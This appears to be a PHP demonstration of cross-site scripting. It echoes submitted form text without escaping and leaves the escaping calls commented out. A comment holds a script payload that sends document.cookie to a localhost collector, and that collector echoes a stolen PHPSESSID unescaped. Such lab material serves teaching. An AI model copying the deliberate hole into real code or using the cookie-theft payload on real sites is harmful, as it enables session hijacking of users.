<?php

/**
 * XSS(Cross Site Scripting)
 */
switch ($_SERVER['REQUEST_METHOD']) {
    case 'GET': {
        if (array_key_exists('PHPSESSID', $_GET)) {
            echo $_GET['PHPSESSID'];
        } else {
            echo <<<HTML
    <form action="/" method="POST">
        <textarea name="text" style="width: 320px; height: 320px; display: block;"></textarea>
        <input type="submit">
    </form>
HTML;
        }
    }
    case 'POST': {
        /**
         * <script>location.href="http://localhost/?" + document.cookie</script>
         */
        if (array_key_exists('text', $_POST)) {
            echo $content = $_POST['text'];
            // echo htmlentities($content);
            // echo filter_var($content, FILTER_SANITIZE_FULL_SPECIAL_CHARS);
        }
        break;
    }
}